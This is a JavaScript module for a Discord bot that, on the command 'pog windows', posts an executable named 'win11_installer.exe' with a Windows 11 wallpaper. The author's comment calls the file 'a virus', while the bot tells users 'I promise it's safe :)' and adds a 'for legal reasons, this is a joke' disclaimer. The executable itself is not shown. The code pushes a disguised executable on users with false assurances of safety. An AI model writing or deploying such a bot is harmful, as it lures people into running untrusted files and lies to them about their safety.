module.exports = {
    checkWindows: function(receivedMessage) {
    const {MessageAttachment} = require('discord.js')
    const chilledwindows = new MessageAttachment('win11_installer.exe') // creates windows installer message attachment
    const win11 = new MessageAttachment('win11bk.png')
    let fullCommand = receivedMessage.content.substr(4) // Remove the leading pog
    let splitCommand = fullCommand.split(" ") // Split the message up in to pieces for each space
    let primaryCommand = splitCommand[0] // The first word directly after "pog" is the command
    found = false

        switch(primaryCommand.toLowerCase()) { // called when messages says 'pog windows'
            case 'windows' :
                receivedMessage.channel.send(chilledwindows) // sends a virus
                receivedMessage.channel.send(win11) // sends Windows 11 wallpaper (1920x1080)
                receivedMessage.channel.send("Install Windows 11 using the installer, I promise it's safe :)") // informs the user that the program is safe
                receivedMessage.channel.send("(For legal reasons, this is a joke.)")
        }
        // value of 'found' will be returned in bot.js
        return found
    }
}